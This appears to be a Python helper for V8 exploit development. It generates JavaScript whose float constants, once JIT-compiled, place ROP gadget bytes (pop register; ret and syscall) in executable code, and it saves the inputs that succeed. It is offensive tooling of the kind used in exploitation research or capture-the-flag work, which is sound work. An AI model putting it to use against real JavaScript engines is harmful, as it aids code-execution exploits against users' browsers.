import os
import re
import sys
import pathlib


gadgets = ['58c3', '5fc3', '5ac3', '5ec3', '0f05']
dd = [0, 0]
exec_path = ''

def excute_js(js:str)->bool:
    f = open('test.js', 'w')
    f.write(js)
    f.close()
    os.system(exec_path + ' --print-opt-code test.js > test.txt')
    f = open('test.txt', 'r')
    lines = f.readlines()
    f.close()
    for line in lines:
        for jsc in gadgets:
            if line.find('xmm') != -1 and line.find(jsc) != -1:
                words = line.split()
                if len(words) > 3 and words[2].find(jsc) != -1 and words[2].find(jsc) % 2 == 0:
                    print(words)
                    gadgets.remove(jsc)
                    os.system('cp test.js ' + jsc + '.js')

def generate_js(count:int):
    ops = ['*', '+', '-', '/', '<<']
    header = \
'''
var array = new Uint8Array();
function syscall_jsc(var1, var2, var3, var4){
'''

    base = 114
    middle1 = ''
    for i in range(count):
        for j in range(4):
            var = 't' + str(i * 4 + j)
            middle1 += '\tvar ' + var + ' = var1 ' + ops[i % len(ops)] + ' 0.' + str(base) + ';\n'
            base += 1
    
    jsc = '\tvar s = t0 + 0.13;\n    return '

    middle2 = ''
    op2s = ['+', '*', '-', '/']
    for i in range(count - 1):
        for j in range(4):
            middle2 += 't' + str(i * 4 + j) + ' ' + op2s[i % len(op2s)]
    middle2 += 't' + str(count-1) + ' * s;\n}'

    tail = '''
for(var i = 0; i < 10000; i++)
{
    syscall_jsc(0.135, 0.122, 0.132, 0.155);
}
'''

    excute_js(header + middle1 + jsc + middle2 + tail)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print('plese input the path of v8')
        exit()
    
    exec_path = sys.argv[1]
    p = pathlib.Path(exec_path)
    if not p.is_file():
        print('path of v8 error')
        exit()


    for i in range(32):
        generate_js(i)
    print('done')